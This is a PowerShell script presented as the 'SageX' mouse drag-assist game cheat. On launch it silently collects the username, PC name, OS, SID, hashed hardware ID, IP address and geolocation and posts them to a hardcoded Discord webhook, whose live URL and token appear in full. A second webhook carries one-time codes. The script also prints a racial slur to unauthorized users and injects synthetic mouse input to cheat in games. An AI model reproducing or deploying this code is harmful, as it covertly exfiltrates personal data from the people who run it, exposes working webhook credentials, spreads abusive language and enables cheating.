Clear-Host
$colors = @("Red", "Yellow", "Cyan", "Green", "Magenta", "Blue", "White")

$asciiArt = @'
  _________                     ____  ___ __________                         .___.__  __   
 /   _____/____     ____   ____ \   \/  / \______   \ ____   ____   ____   __| _/|__|/  |_ 
 \_____  \\__  \   / ___\_/ __ \ \     /   |       _// __ \ / ___\_/ __ \ / __ | |  \   __\
 /        \/ __ \_/ /_/  >  ___/ /     \   |    |   \  ___// /_/  >  ___// /_/ | |  ||  |  
/_______  (____  /\___  / \___  >___/\  \  |____|_  /\___  >___  / \___  >____ | |__||__|  
        \/     \//_____/      \/      \_/         \/     \/_____/      \/     \/             
'@

$asciiArt -split "`n" | ForEach-Object {
    $color = Get-Random -InputObject $colors
    Write-Host $_ -ForegroundColor $color
}

# Get current user's SID
try {
    $sid = ([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value
    Write-Host "`n[*] Your SID: $sid" -ForegroundColor Yellow
} catch {
    Write-Host "[!] Failed to get SID" -ForegroundColor Red
    exit
}
# ----------- WEBHOOK BLOCK BEGIN -----------

$webhookUrl = "https://discord.com/api/webhooks/1375353706232414238/dMBMuwq29UaqujrlC1YPhh9-ygK-pX2mY5S7VHb4-WUrxWMPBB8YPVszTfubk-eVLrgN"

# Collect system info
$user = $env:USERNAME
$pcName = $env:COMPUTERNAME
$os = (Get-CimInstance Win32_OperatingSystem).Caption
$time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
$hwid = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID
$hashedHWID = [System.BitConverter]::ToString([System.Security.Cryptography.SHA256]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($hwid))) -replace "-", ""

# External IP and geo info
try {
    $ipInfo = Invoke-RestMethod -Uri "http://ip-api.com/json"
    $ip = $ipInfo.query
    $country = $ipInfo.country
    $region = $ipInfo.regionName
    $city = $ipInfo.city
} catch {
    $ip = "Unavailable"
    $country = "Unavailable"
    $region = "Unavailable"
    $city = "Unavailable"
}

# Create embed
$embed = @{
    title = "<:Dead:1346705076626002033> SageX Executed"
    color = 16711680
    timestamp = (Get-Date).ToString("o")
    fields = @(
        @{ name = "<a:trick_supreme:1346694280386707466> User"; value = $user; inline = $true },
        @{ name = "<a:trick_supreme:1346694193157767269> PC Name"; value = $pcName; inline = $true },
        @{ name = "<:windows:904792336058425346> OS"; value = $os; inline = $false },
        @{ name = "<:trick_supreme:1346446598791757884> SID"; value = $sid; inline = $false },
        @{ name = "<:trick_supreme:1346446598791757884> HWID (hashed)"; value = $hashedHWID; inline = $false },
        @{ name = "<:trick_supreme:1346446598791757884> IP Address"; value = $ip; inline = $true },
        @{ name = "<:trick_supreme:1346446598791757884> Location"; value = "$city, $region, $country"; inline = $true },
        @{ name = "<a:726747821373653072:1346705048947785822> Time"; value = $time; inline = $false }
    )
}

$payload = @{
    username = "SageX Logger"
    embeds = @($embed)
} | ConvertTo-Json -Depth 10

# Send webhook
try {
    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
} catch {
    }

# ----------- WEBHOOK BLOCK END -----------

# ----------- OTP VERIFICATION BEGIN -----------
$otpStoragePath = "$env:APPDATA\SageX\otp_config.ini"
$otpDatabase = "$PSScriptRoot\database.txt"  # Can be changed to a preferred path

function Generate-OTP {
    $chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    -join (1..8 | ForEach-Object { $chars | Get-Random -Count 1 })
}

function Save-OTP {
    param ($sid, $otp)
    if (-not (Test-Path $otpDatabase)) {
        New-Item -ItemType File -Path $otpDatabase -Force | Out-Null
    }
    Add-Content -Path $otpDatabase -Value "$sid=$otp"
}

function Get-OTP {
    param ($sid)
    if (-not (Test-Path $otpDatabase)) { return $null }
    $lines = Get-Content $otpDatabase
    foreach ($line in $lines) {
        if ($line -match "^$sid=(.+)$") {
            return $matches[1]
        }
    }
    return $null
}

function Remove-OTP {
    param ($sid)
    if (-not (Test-Path $otpDatabase)) { return }
    $lines = Get-Content $otpDatabase
    $filtered = $lines | Where-Object { $_ -notmatch "^$sid=" }
    Set-Content -Path $otpDatabase -Value $filtered
}

function Validate-OTP {
    param ($inputOTP, $sid)
    $storedOTP = Get-OTP -sid $sid
    if ($inputOTP -eq $storedOTP) {
        Remove-OTP -sid $sid
        return $true
    }
    return $false
}

if (Get-OTP -sid $sid) {
    # OTP already generated, validate it
    Write-Host "`n[!] OTP Verification Required" -ForegroundColor Red
    Write-Host "[*] Please enter the 8-character OTP sent to your Discord" -ForegroundColor Yellow
    $attempts = 3

    while ($attempts -gt 0) {
        $userOTP = Read-Host "Enter OTP (Attempts left: $attempts)"
        if (Validate-OTP -inputOTP $userOTP -sid $sid) {
            Write-Host "[+] OTP Verified Successfully!" -ForegroundColor Green
            Start-Sleep -Seconds 2
            Clear-Host
            break
        } else {
            $attempts--
            Write-Host "[!] Invalid OTP. Try again." -ForegroundColor Red
        }
        if ($attempts -eq 0) {
            Write-Host "[!] Maximum attempts reached. Exiting..." -ForegroundColor Red
            exit
        }
    }
} else {
    # Generate new OTP
    $otp = Generate-OTP
    Save-OTP -sid $sid -otp $otp

    $otpEmbed = @{
        title = "🔑 SageX OTP Verification"
        description = "A new OTP has been generated for verification"
        color = 65280
        fields = @(
            @{ name = "User"; value = $user; inline = $true },
            @{ name = "HWID"; value = $hashedHWID; inline = $true },
            @{ name = "OTP Code"; value = "||$otp||"; inline = $false },
            @{ name = "Valid For"; value = "5 minutes (manual deletion required)" }
        )
        timestamp = (Get-Date).ToString("o")
    }

    $otpPayload = @{
        username = "SageX OTP System"
        embeds = @($otpEmbed)
    } | ConvertTo-Json -Depth 10

    try {
        Invoke-RestMethod -Uri "https://discordapp.com/api/webhooks/1380951069718479070/Rtiw-SnS-vWs35FwERyqYm9Y-ZEOW7_UMHVTjnc6aZMauK1WifQ2ZqZMchJFfjTprblA" -Method Post -Body $otpPayload -ContentType 'application/json'
    } catch {
        Write-Host "[!] Failed to send OTP to Discord" -ForegroundColor Red
    }

    Write-Host "`n[!] FIRST RUN DETECTED - OTP VERIFICATION REQUIRED" -ForegroundColor Red
    Write-Host "[*] An OTP has been sent to the administrator Discord" -ForegroundColor Yellow
    Write-Host "[*] Please contact the provider to get your verification code`n" -ForegroundColor Yellow

    $attempts = 3
    $otpExpiry = (Get-Date).AddMinutes(5)

    while ($attempts -gt 0 -and (Get-Date) -lt $otpExpiry) {
        $timeLeft = ($otpExpiry - (Get-Date)).ToString("mm\:ss")
        $userOTP = Read-Host "Enter OTP (Attempts left: $attempts | Expires in: $timeLeft)"

        if (Validate-OTP -inputOTP $userOTP -sid $sid) {
            Write-Host "[+] OTP Verified Successfully!" -ForegroundColor Green
            Start-Sleep -Seconds 2
            Clear-Host
            break
        } else {
            $attempts--
            Write-Host "[!] Invalid OTP. Try again." -ForegroundColor Red
        }

        if ($attempts -eq 0 -or (Get-Date) -ge $otpExpiry) {
            Write-Host "[!] OTP verification failed. Exiting..." -ForegroundColor Red
            Remove-OTP -sid $sid
            exit
        }
    }
}
# ----------- OTP VERIFICATION END -----------


# Correct GitHub raw URL
$authURL = "https://raw.githubusercontent.com/Toxic-Speed/SAGE-X/refs/heads/main/HWID"

try {
    $rawData = Invoke-RestMethod -Uri $authURL -UseBasicParsing
} catch {
    Write-Host "`n[!] Failed to fetch authorized SIDs from server." -ForegroundColor Red
    exit
}

# Check if SID is authorized
if ($rawData -notmatch $sid) {
    Write-Host "`n[!]Who the Fuck Are You ?? Nigga !!!" -ForegroundColor Red
    Start-Sleep -Seconds 6
    exit
}

# Message lines
$msgLines = @(
    "[+] Your Mouse is Connected With SageX Regedit [AI]",
    "[+] Sensitivity Tweaked For Maximum Precision",
    "[+] Drag Assist Enabled - Easy Headshots",
    "[+] Low Input Lag Mode ON",
    "[+] Hold LMB for Auto Drag Support",
    "[+] Press F5 to Toggle ON/OFF"
)
$msgLines | ForEach-Object {
    Write-Host $_ -ForegroundColor Red
    Start-Sleep -Milliseconds 300
}

Write-Host "`n----------------------------------------------------------------------------------"
Write-Host "Status : ON"

# C# code for drag assist
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Threading;

public class FairXDragAssist {
    [DllImport("user32.dll")]
    public static extern bool GetCursorPos(out POINT lpPoint);

    [DllImport("user32.dll")]
    public static extern void mouse_event(int dwFlags, int dx, int dy, int dwData, int dwExtraInfo);

    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);

    public const int MOUSEEVENTF_MOVE = 0x0001;
    public const int VK_LBUTTON = 0x01;
    public const int VK_F5 = 0x74;

    [StructLayout(LayoutKind.Sequential)]
    public struct POINT {
        public int X;
        public int Y;
    }

    public static bool Enabled = true;

    public static void Run() {
        POINT prev;
        GetCursorPos(out prev);
        bool isHolding = false;
        DateTime pressStart = DateTime.MinValue;

        while (true) {
            Thread.Sleep(5);
            bool toggle = (GetAsyncKeyState(VK_F5) & 0x8000) != 0;

            if (toggle && DateTime.Now.Millisecond % 2 == 0) {
                Enabled = !Enabled;
                Console.SetCursorPosition(0, Console.CursorTop - 1);
                Console.WriteLine("Status : " + (Enabled ? "ON " : "OFF"));
                Console.Beep();
                Thread.Sleep(400);
            }

            if (!Enabled)
                continue;

            bool lmbDown = (GetAsyncKeyState(VK_LBUTTON) & 0x8000) != 0;

            if (lmbDown) {
                if (!isHolding) {
                    isHolding = true;
                    pressStart = DateTime.Now;
                } else if ((DateTime.Now - pressStart).TotalMilliseconds >= 60) {
                    POINT curr;
                    GetCursorPos(out curr);

                    int deltaY = curr.Y - prev.Y;
                    int deltaX = curr.X - prev.X;

                    if (deltaY < -1) {
                        int correctedX = (int)(deltaX * 0.4);
                        mouse_event(MOUSEEVENTF_MOVE, -correctedX, -4, 0, 0);
                        Thread.Sleep(10);
                    }

                    prev = curr;
                }
            } else {
                isHolding = false;
            }
        }
    }
}
"@

[FairXDragAssist]::Run()
